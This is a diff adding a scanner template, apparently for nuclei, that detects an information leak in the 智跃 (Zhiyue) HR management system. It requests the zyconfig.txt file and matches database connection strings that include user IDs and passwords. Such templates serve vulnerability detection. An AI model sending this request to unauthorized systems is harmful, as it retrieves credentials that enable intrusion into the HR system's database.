@@ -1,0 +1,30 @@
+id: poc-yaml-zyehr-zyconfig-txt-info-leak
+info:
+  name: "智跃人力资源管理系统zyconfig.txt文件信息泄露"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 智跃人力资源管理系统
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/resource/servs/file/zyconfig.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Data Source="
+          - "User ID="
+          - "PassWord="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "text/plain"
